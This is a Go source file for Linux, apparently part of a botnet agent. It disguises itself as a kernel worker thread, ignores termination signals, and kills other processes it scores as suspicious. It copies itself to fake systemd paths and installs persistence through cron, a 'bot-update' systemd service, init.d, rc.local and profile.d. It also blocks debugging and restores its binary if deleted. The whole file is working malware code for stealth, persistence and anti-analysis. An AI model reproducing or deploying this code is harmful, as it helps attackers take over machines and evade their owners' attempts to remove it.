//go:build linux

package process

import (
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var persistPaths = []string{
	"/usr/lib/systemd/systemd-update",
	"/usr/lib/systemd/systemd-timesyncd",
	"/lib/systemd/systemd-update",
}

func GetTotalRAM() int64 {
	d, err := os.ReadFile("/proc/meminfo")
	if err == nil {
		for _, line := range strings.Split(string(d), "\n") {
			if strings.HasPrefix(line, "MemTotal:") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					kb, err := strconv.ParseInt(parts[1], 10, 64)
					if err == nil && kb > 0 {
						return kb / 1024
					}
				}
			}
		}
	}
	var info syscall.Sysinfo_t
	if err := syscall.Sysinfo(&info); err == nil && info.Totalram > 0 {
		return int64(info.Totalram) * int64(info.Unit) / (1024 * 1024)
	}
	return 0
}

func GetTotalDisk() int64 {
	for _, p := range []string{"/", "/var", "/data", "/mnt"} {
		var stat syscall.Statfs_t
		if err := syscall.Statfs(p, &stat); err == nil && int64(stat.Blocks) > 0 {
			return (int64(stat.Blocks) * int64(stat.Bsize)) / (1024 * 1024)
		}
	}
	return 0
}

func Hide() {
	if os.Getppid() != 1 {
		exe := os.Args[0]
		if _, err := os.Stat(exe); os.IsNotExist(err) {
			if r, err := os.Readlink("/proc/self/exe"); err == nil {
				exe = r
			}
		}
		cmd := exec.Command(exe, os.Args[1:]...)
		if err := cmd.Start(); err != nil {
			return
		}
		time.Sleep(100 * time.Millisecond)
		os.Exit(0)
	}
	sigs := []os.Signal{syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT, syscall.SIGTSTP}
	c := make(chan os.Signal, 1)
	signal.Notify(c, sigs...)
	go func() { for range c {} }()
	os.WriteFile("/proc/self/comm", []byte("[kworker/0:0]"), 0644)
	for i := 1; i < len(os.Args); i++ {
		os.Args[i] = ""
	}
}

func StartKiller() {
	go func() {
		for {
			d, _ := os.Open("/proc")
			if d == nil {
				time.Sleep(2 * time.Second)
				continue
			}
			entries, _ := d.Readdir(-1)
			d.Close()
			for _, e := range entries {
				pid, err := strconv.Atoi(e.Name())
				if err != nil || pid == os.Getpid() {
					continue
				}
				if checkProc(pid) {
					syscall.Kill(pid, syscall.SIGKILL)
				}
			}
			time.Sleep(2 * time.Second)
		}
	}()
}

func readExe(pid int) string {
	p := "/proc/" + strconv.Itoa(pid) + "/exe"
	r, _ := os.Readlink(p)
	return r
}

func isSysPath(exe string) bool {
	if exe == "" {
		return false
	}
	if strings.HasPrefix(exe, "/usr") || strings.HasPrefix(exe, "/bin") || strings.HasPrefix(exe, "/sbin") || strings.HasPrefix(exe, "/lib") {
		return true
	}
	if strings.HasPrefix(exe, "/lib64") {
		return true
	}
	if strings.Contains(exe, "/systemd") {
		return true
	}
	return false
}

func isTemp(exe string) bool {
	return strings.Contains(exe, "/tmp") || strings.Contains(exe, "/dev/shm") || strings.Contains(exe, "/var/tmp")
}

func checkProc(pid int) bool {
	s := strconv.Itoa(pid)

	exe := readExe(pid)
	if exe == "" {
		goto score
	}

	for _, d := range []string{"/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/", "/lib/", "/usr/lib/", "/usr/lib64/"} {
		if strings.HasPrefix(exe, d) {
			return false
		}
	}
	if isSysPath(exe) {
		return false
	}

score:
	score := 0

	if exe != "" {
		if strings.Contains(exe, "(deleted)") {
			score++
		}
		if isTemp(exe) {
			score++
		}
		if fi, _ := os.Stat(exe); fi != nil && fi.Mode()&0002 != 0 {
			score++
		}
		if f, _ := os.Open(exe); f != nil {
			hdr := make([]byte, 7)
			n, _ := f.Read(hdr)
			f.Close()
			if n >= 7 && string(hdr[:7]) == "UPX..." {
				score++
			}
		}
	} else {
		score++
	}

	if raw, _ := os.ReadFile("/proc/" + s + "/cmdline"); raw != nil {
		cmdline := strings.ReplaceAll(string(raw), "\x00", " ")
		if (strings.Contains(cmdline, "systemd") || strings.Contains(cmdline, "kthreadd") || strings.Contains(cmdline, "init")) && exe != "" && !strings.Contains(exe, "systemd") && !strings.Contains(exe, "init") {
			score++
		}
	}

	if env, _ := os.ReadFile("/proc/" + s + "/environ"); env != nil && strings.Contains(string(env), "LD_PRELOAD=") {
		score++
	}

	if stat, _ := os.ReadFile("/proc/" + s + "/stat"); stat != nil {
		f := strings.Fields(string(stat))
		if len(f) >= 15 {
			ut, _ := strconv.ParseInt(f[13], 10, 64)
			st, _ := strconv.ParseInt(f[14], 10, 64)
			if ut+st > 20000000 {
				score++
			}
		}
	}

	// TCP check removed — was reading system-wide /proc/net/tcp and
	// applying score to every PID regardless of whose connection it was

	var st1, st2 syscall.Stat_t
	if syscall.Stat("/proc/1/ns/pid", &st1) == nil && syscall.Stat("/proc/"+s+"/ns/pid", &st2) == nil && st1.Ino != st2.Ino {
		score++
	}

	if maps, _ := os.ReadFile("/proc/" + s + "/maps"); maps != nil && len(strings.TrimSpace(string(maps))) == 0 {
		score++
	}

	if status, _ := os.ReadFile("/proc/" + s + "/status"); status != nil {
		for _, line := range strings.Split(string(status), "\n") {
			if strings.HasPrefix(line, "TracerPid:") && strings.TrimSpace(line[10:]) != "0" {
				score++
			}
		}
	}

	if fd, _ := os.Open("/proc/" + s + "/fd"); fd != nil {
		names, _ := fd.Readdir(-1)
		fd.Close()
		for _, n := range names {
			lk, _ := os.Readlink("/proc/" + s + "/fd/" + n.Name())
			if strings.Contains(lk, "raw") {
				score++
				break
			}
		}
	}

	if _, err := os.Stat("/etc/ld.so.preload"); err == nil {
		score++
	}

	if stat, _ := os.ReadFile("/proc/" + s + "/stat"); stat != nil {
		f := strings.Fields(string(stat))
		if len(f) >= 4 {
			ppid, _ := strconv.Atoi(f[3])
			if ppid == 1 {
				raw, _ := os.ReadFile("/proc/" + s + "/cmdline")
				cmdline := strings.ReplaceAll(string(raw), "\x00", " ")
				if !strings.Contains(cmdline, "systemd") {
					score++
				}
			}
		}
	}

	return score >= 2
}

func Persist() {
	exe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return
	}
	dst := pickPersistPath(exe)
	go persistLoop(dst)
}

func pickPersistPath(exe string) string {
	for _, p := range persistPaths {
		if exe == p {
			return p
		}
		if _, err := os.Stat(p); err == nil {
			continue
		}
		dir := p[:strings.LastIndex(p, "/")]
		os.MkdirAll(dir, 0755)
		if err := os.WriteFile(p, nil, 0755); err == nil {
			os.Remove(p)
			copyFile(exe, p)
			return p
		}
	}
	return exe
}

func copyFile(src, dst string) {
	d, err := os.ReadFile(src)
	if err != nil {
		return
	}
	os.WriteFile(dst, d, 0755)
}

func persistLoop(dst string) {
	for {
		if _, err := os.Stat(dst); os.IsNotExist(err) {
			if exe, err := os.Readlink("/proc/self/exe"); err == nil {
				copyFile(exe, dst)
			}
		}
		installCron(dst)
		installCronDir(dst)
		installSystemd(dst)
		installInitd(dst)
		installRcLocal(dst)
		installProfile(dst)
		time.Sleep(60 * time.Second)
	}
}

func installCron(path string) {
	entry := "@reboot " + path + "\n*/10 * * * * " + path + "\n"
	out, _ := exec.Command("crontab", "-l").Output()
	if strings.Contains(string(out), path) {
		return
	}
	tmp := "/tmp/.cron"
	os.WriteFile(tmp, []byte(strings.TrimRight(string(out), "\n")+"\n"+entry), 0600)
	exec.Command("crontab", tmp).Run()
	os.Remove(tmp)
}

func installCronDir(path string) {
	f := "/etc/cron.d/system-update"
	if _, err := os.Stat(f); err == nil {
		return
	}
	entry := "@reboot root " + path + "\n*/10 * * * * root " + path + "\n"
	os.WriteFile(f, []byte(entry), 0644)
}

func installSystemd(path string) {
	svc := "/etc/systemd/system/bot-update.service"
	if _, err := os.Stat(svc); err == nil {
		return
	}
	unit := "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=" + path + "\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n"
	os.WriteFile(svc, []byte(unit), 0644)
	exec.Command("systemctl", "enable", "bot-update.service").Run()
	exec.Command("systemctl", "start", "bot-update.service").Run()
}

func installInitd(path string) {
	f := "/etc/init.d/system-update"
	if _, err := os.Stat(f); err == nil {
		return
	}
	script := "#!/bin/sh\n#\n# System Update\n#\ncase \"$1\" in\n  start)\n    " + path + " &\n    ;;\n  stop)\n    killall systemd-update 2>/dev/null\n    ;;\n  restart)\n    $0 stop; $0 start\n    ;;\n  *)\n    exit 1\n    ;;\nesac\n"
	os.WriteFile(f, []byte(script), 0755)
	exec.Command("update-rc.d", "system-update", "defaults").Run()
	exec.Command("service", "system-update", "start").Run()
}

func installRcLocal(path string) {
	d, err := os.ReadFile("/etc/rc.local")
	if err != nil {
		return
	}
	s := string(d)
	if strings.Contains(s, path) {
		return
	}
	os.WriteFile("/etc/rc.local", []byte(strings.Replace(s, "exit 0", path+" &\nexit 0", 1)), 0755)
}

func installProfile(path string) {
	sp := "/etc/profile.d/system-update.sh"
	if _, err := os.Stat(sp); err == nil {
		return
	}
	os.WriteFile(sp, []byte("#!/bin/bash\nif [[ -x "+path+" ]]; then nohup "+path+" >/dev/null 2>&1 & fi\n"), 0755)
}

const (
	PR_SET_PTRACER  = 0x59616d61
	PR_SET_DUMPABLE = 4
	PR_GET_DUMPABLE = 3
)

func Protect() {
	syscall.Syscall(syscall.SYS_PRCTL, PR_SET_DUMPABLE, 0, 0)
	syscall.Syscall(syscall.SYS_PRCTL, PR_SET_PTRACER, 0, 0)

	sigs := []os.Signal{syscall.SIGTERM, syscall.SIGQUIT, syscall.SIGINT, syscall.SIGHUP, syscall.SIGTSTP}
	c := make(chan os.Signal, 1)
	signal.Notify(c, sigs...)
	go func() { for range c {} }()

	go func() {
		for {
			if d, _ := os.ReadFile("/proc/self/status"); d != nil {
				for _, line := range strings.Split(string(d), "\n") {
					if strings.HasPrefix(line, "TracerPid:") && strings.TrimSpace(line[10:]) != "0" {
						os.Exit(1)
					}
				}
			}
			time.Sleep(3 * time.Second)
		}
	}()

	go func() {
		for {
			exe, err := os.Readlink("/proc/self/exe")
			if err != nil {
				time.Sleep(5 * time.Second)
				continue
			}
			if _, err := os.Stat(exe); os.IsNotExist(err) {
				if r, err := os.Readlink("/proc/self/exe"); err == nil {
					copyFile(r, exe)
					os.Chmod(exe, 0755)
				}
			}
			time.Sleep(10 * time.Second)
		}
	}()
}
